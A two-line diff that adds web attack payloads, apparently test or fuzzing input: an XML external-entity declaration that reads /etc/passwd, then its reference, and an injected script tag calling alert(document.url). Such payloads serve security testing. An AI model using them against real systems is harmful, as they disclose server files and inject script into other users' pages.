@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY xxerakua SYSTEM "file:///etc/passwd"> ]></code> <script> alert(document.url)<code>
+&xxerakua;
